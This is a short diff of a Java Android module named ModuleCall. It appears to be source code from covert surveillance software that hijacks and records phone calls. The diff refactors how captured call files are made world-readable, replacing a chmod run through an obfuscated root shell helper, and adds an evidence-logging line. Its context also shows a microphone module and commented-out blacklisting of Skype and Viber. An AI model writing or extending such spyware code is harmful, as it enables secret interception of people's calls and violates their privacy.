@@ -297,9 +297,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (installHijack), Cannot start, because Mic is running");
 			}
 			return false;
-			//ModuleMic.self().suspend();
-			// ModuleMic.self().addBlacklist("skype");
-			// ModuleMic.self().addBlacklist("viber");
 		}
 
 		hjcb = new CallBack();
@@ -311,6 +308,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(actualStart): hijacker successfully installed");
 			}
+			EvidenceBuilder.info(M.e("Call Module ready"));
 
 		} else {
 			if (Cfg.DEBUG) {
@@ -353,8 +351,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 
 				// Make it read-write
-
-				Execute.execute(Configuration.shellFile + " " + M.e("qzx chmod 666 ") + fullName);
+				Execute.chmod("666", fullName);
 
 				storedFile.delete();
 			}
@@ -404,7 +401,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		hjcb.trigger(s);
 
 		// Make it read-write in any case
-		Execute.execute(Configuration.shellFile + " " + M.e("qzx chmod 666 ") + s);
+		Execute.chmod("666", s);
 
 		// Add the file to the list
 		calls.add(s);
